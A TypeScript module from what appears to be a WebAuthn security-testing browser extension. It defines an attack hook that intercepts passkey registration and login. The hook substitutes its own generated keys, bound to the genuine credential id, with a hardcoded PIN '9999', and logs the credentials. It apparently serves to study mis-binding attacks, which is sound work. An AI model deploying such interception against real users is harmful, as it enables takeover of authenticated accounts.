import { AttackHook } from '../attacks/attack_hook';
import { disabledIcons, enabledIcons } from '../constants';
import { getLogger } from '../logging';
import { getOriginFromUrl, webauthnParse, webauthnStringify } from '../utils';
import { generateKeyRequestAndAttestation, generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError } from '../webauthn';

const log = getLogger('background');

export class AttackHookMisBindingAllowLogin extends AttackHook {
    getName(): string {
        return 'attack-mis-binding-allow-login';
    }

    async onCredentialCreate(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender): Promise<WebAuthnResponseMessage | WebAuthnErrorMessage> {
        const origin = getOriginFromUrl(sender.url);

        const originalCredential = webauthnParse(msg.originalCredential);

        const id = originalCredential.id;
        const rawId = Array.from(new Uint8Array(originalCredential.rawId));

        try {
            const opts = webauthnParse(msg.options);
            log.debug(msg);
            const credential = await generateRegistrationKeyAndAttestation(
                origin,
                opts.publicKey,
                '9999',
                id,
                rawId,
            );

            log.debug('create credential');
            log.debug(credential);
            log.debug(webauthnStringify(credential));
            log.debug('RE PARSE ', webauthnParse(webauthnStringify(credential)));
            return {
                credential: webauthnStringify(credential),
                requestID: msg.requestID,
                type: 'create_response',
            };
        } catch (e) {
            if (e instanceof DOMException) {
                const { code, message, name } = e;
                log.error('failed to import key due to DOMException', { code, message, name }, e);
            } else {
                log.error('failed to import key', { errorType: `${(typeof e)}` }, e);
            }

            return {
                requestID: msg.requestID,
                type: 'error',
                exception: e.toString()
            };
        }
    }

    async onCredentialGet(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender): Promise<WebAuthnResponseMessage | WebAuthnErrorMessage> {
        const origin = getOriginFromUrl(sender.url);
        const opts = webauthnParse(msg.options);

        log.debug(opts);
        // const pin = await requestPin(sender.tab.id, origin);
        log.debug('Origin in background sign function', origin);

        try {
            const credential = await generateKeyRequestAndAttestation(origin, opts.publicKey, `9999`);
            const authenticatedResponseData = {
                credential: webauthnStringify(credential),
                requestID: msg.requestID,
                type: 'sign_response',
            };
            log.debug(msg);
            log.debug('auth credential');
            log.debug(credential);
            log.debug(webauthnStringify(credential));
            return authenticatedResponseData;
        } catch (e) {
            if (e instanceof DOMException) {
                const { code, message, name } = e;
                log.error('failed to sign due DOMException', { code, message, name }, e);
            } else {
                log.error('failed to sign', { errorType: `${(typeof e)}` }, e);
            }

            return {
                requestID: msg.requestID,
                type: 'error',
                exception: e.toString()
            };
        }
    }
}